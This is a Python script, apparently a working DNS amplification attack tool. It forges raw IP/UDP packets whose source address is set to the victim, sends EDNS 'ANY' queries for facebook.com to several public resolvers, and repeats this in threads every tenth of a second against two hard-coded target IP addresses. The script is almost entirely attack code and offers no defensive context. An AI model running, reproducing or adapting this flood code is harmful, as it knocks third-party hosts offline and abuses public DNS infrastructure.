import socket
import ipaddress
import struct
import logging
import random
import time
import threading
import os


def checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i + 1])
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s


def create_dns_query(domain):
    transaction_id = random.randint(0, 65535)
    flags = 0x0100
    questions = 1
    answer_rrs = 0
    authority_rrs = 0
    additional_rrs = 1 
    query = struct.pack(">HHHHHH", transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs)

    query_name = b''.join([bytes([len(part)]) + part.encode() for part in domain.split('.')]) + b'\x00'
    
    query_type = 255  # ANY record
    query_class = 1   # IN (Internet)
    
    query += query_name + struct.pack(">HH", query_type, query_class)
    
    
    edns_name = 0
    edns_type = 41  # EDNS OPT record
    edns_udp_payload_size = 4096
    edns_extended_rcode = 0
    edns_edns_version = 0
    edns_z = 0
    edns_data_length = 0

    query += struct.pack(">BHHBBH", edns_name, edns_type, edns_udp_payload_size, edns_extended_rcode, edns_edns_version, edns_data_length)
    
    return query


def create_ip_header(source_ip, dest_ip, payload_length):
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        69,             
        0,               
        20 + payload_length,  
        random.randint(0, 65535), 
        0,                
        64,                
        socket.IPPROTO_UDP, 
        0,                  
        socket.inet_aton(source_ip), 
        socket.inet_aton(dest_ip)   
    )
    
    checksum_val = checksum(ip_header)
    ip_header = struct.pack(
        '!BBHHHBBH4s4s',
        69, 0, 20 + payload_length, random.randint(0, 65535), 0, 64,
        socket.IPPROTO_UDP, checksum_val, socket.inet_aton(source_ip), socket.inet_aton(dest_ip)
    )
    
    return ip_header

def create_udp_header(source_port, dest_port, payload):
    udp_length = 8 + len(payload)
    udp_header = struct.pack(
        '!HHHH',
        source_port,
        dest_port,
        udp_length,
        0
    )
    return udp_header


def send_spoofed_dns_query(spoofed_ip, dns_server, domain):
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    
    query = create_dns_query(domain)
    ip_header = create_ip_header(spoofed_ip, dns_server, len(query) + 8)
    udp_header = create_udp_header(random.randint(1024, 65535), 53, query)

    packet = ip_header + udp_header + query
    sock.sendto(packet, (dns_server, 53))
    print(f"Sent spoofed DNS query from {spoofed_ip} to {dns_server}")

def send_amplified_request(target_ip, dns_server, domain):
    if not is_valid_ip(target_ip):
        print("Invalid target IP address.")
        logging.error("Invalid target IP address: %s", target_ip)
        return

    if not is_valid_ip(dns_server):
        print("Invalid DNS server IP address.")
        logging.error("Invalid DNS server IP address: %s", dns_server)
        return

    try:
        send_spoofed_dns_query(target_ip, dns_server, domain)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        logging.error("An unexpected error occurred: %s", e)

def worker(target_ips, dns_server, domain):
    global running
    while running:
        for target_ip in target_ips:
            send_amplified_request(target_ip, dns_server, domain)
            time.sleep(interval)

def is_valid_ip(ip):
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("Este script deve ser executado como root.")
        exit()

    logging.basicConfig(level=logging.INFO, filename='dns.log', filemode='a', format='%(asctime)s - %(levelname)s - %(message)s')

    target_ip = ["172.67.171.222", "104.21.29.216"]
    dns_servers = ["8.8.8.8", "1.1.1.1", "9.9.9.9", "208.67.222.222", "8.26.56.26"]
    domain = "facebook.com"
    interval = 0.1  # seconds
    running = True

    threads = []

    try:
        for dns_server in dns_servers:
            thread = threading.Thread(target=worker, args=(target_ip, dns_server, domain))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

    except KeyboardInterrupt:
        print("Process interrupted by user.")
        logging.info("Process interrupted by user.")
        running = False

        for thread in threads:
            thread.join()

    print("Program terminated.")
    logging.info("Program terminated.")
